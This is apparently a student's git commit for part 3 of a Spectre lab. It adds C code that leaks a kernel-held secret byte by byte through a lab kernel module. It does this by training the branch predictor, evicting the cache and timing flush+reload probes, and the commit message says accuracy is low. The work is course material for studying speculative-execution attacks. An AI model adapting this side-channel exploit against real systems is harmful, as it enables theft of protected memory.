3f1fc47e2b2c95eefbadfc7d7c68b7b097f502a8
Sean Blizard <emailseanblizard@gmail.com>
2026-03-27 15:48:18 -0400

    part3 with low accuracy

--- lab-spectre/part3-src/attacker-part3.c
+++ lab-spectre/part3-src/attacker-part3.c
@@ -7,9 +7,18 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <immintrin.h>
 
 #include "labspectre.h"
 #include "labspectreipc.h"
+
+#define PAGE_SIZE 4096
+#define NUM_SLOTS 256
+#define TRIALS 200
+#define TRAIN_PER_ATTACK 20
+#define EVICT_SIZE (11 * 1024 * 1024)
+
+uint8_t *evict_buf;
 
 /*
  * call_kernel_part3
@@ -29,6 +38,99 @@ static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t 
     write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
 }
 
+
+void init_evict_buf() {
+    // Allocates the eviction buffer for flushing the L3 cache.
+  evict_buf = malloc(EVICT_SIZE);
+
+  // Touch each page.
+  for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
+    evict_buf[i] = 1;
+  }
+}
+
+
+static void flush_probe_array(uint8_t *base) {
+    // Flushes all 256 page spaced probe slots from the cache.
+    for (int i = 0; i < 256; i++) {
+        clflush(base + (i * 4096));
+    }
+    // Call _mm_mfence to make sure cache is flushed before function finishes.
+    _mm_mfence();
+}
+
+
+static void evict_cache() {
+    // Forcibly evicts the L3 cache by accessing evict_buf.
+    for (int a = 0; a < 4; a++) {
+        for (size_t i = 0; i < EVICT_SIZE; i += 4096) {
+            evict_buf[i] ^= 1;
+        }
+    }
+}
+
+static int reload_and_find_hit(char *shared_memory) {
+    // Returns index of probe slot with fastest return time.
+    int best_index = -1;
+    uint64_t best_time = (uint64_t)-1;
+
+    // Check all slots and see which has shortest time access. 
+    for (int i = 0; i < NUM_SLOTS; i++) {
+        int idx = (i * 167 + 13) & 0xFF;
+        volatile char *slot = (volatile char *)&shared_memory[idx * PAGE_SIZE];
+
+        uint64_t t = time_access((void *)slot);
+
+        if (t < best_time) {
+            best_time  = t;
+            best_index = idx;
+        }
+    }
+    return best_index;
+}
+
+
+static unsigned char leak_byte(int kernel_fd, char *shared_memory, size_t offset) {
+    // Leak byte of kernel secret at given offset.
+    int votes[NUM_SLOTS] = {0};
+
+    // Run many trials to reduce noise
+    for (int t = 0; t < TRIALS; t++) {
+	// Train
+	for (int i  = 0; i < TRAIN_PER_ATTACK - 2; i++) {
+	    call_kernel_part3(kernel_fd, shared_memory, 0);
+	}
+	call_kernel_part3(kernel_fd, shared_memory, 0);
+	call_kernel_part3(kernel_fd, shared_memory, 0);
+
+	// Evict 
+	evict_cache();
+
+	// Flush
+	flush_probe_array(shared_memory);
+    	_mm_mfence();
+
+	// Attack
+    	call_kernel_part3(kernel_fd, shared_memory, offset);
+
+	// Reload
+    	int hit = reload_and_find_hit(shared_memory);
+	if (hit >= 0) {
+		votes[hit]++;
+	}
+    }
+
+    // Return slot index with the highest number of votes.
+    int best_val = 0;
+    for (int i = 1; i < NUM_SLOTS; i++) {
+        if (votes[i] > votes[best_val]) {
+            best_val = i;
+        }
+    }
+    return (unsigned char)best_val;
+}
+
+
 /*
  * run_attacker
  *
@@ -40,13 +142,21 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
     size_t current_offset = 0;
 
+    init_evict_buf();
+
+    for (int i = 0; i < 256; i++) {
+        shared_memory[i * PAGE_SIZE] = 0;
+    }
+    _mm_mfence();
+
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        char leaked_byte;
+        unsigned char leaked_byte = leak_byte(kernel_fd, shared_memory, current_offset);
 
-        // [Part 3]- Fill this in!
-        // leaked_byte = ??
+
+	printf("offset %zu -> 0x%02x ('%c')\n", current_offset, leaked_byte, (leaked_byte >= 0x20 && leaked_byte < 0x7f) ? leaked_byte : '?');
+
 
         leaked_str[current_offset] = leaked_byte;
         if (leaked_byte == '\x00') {
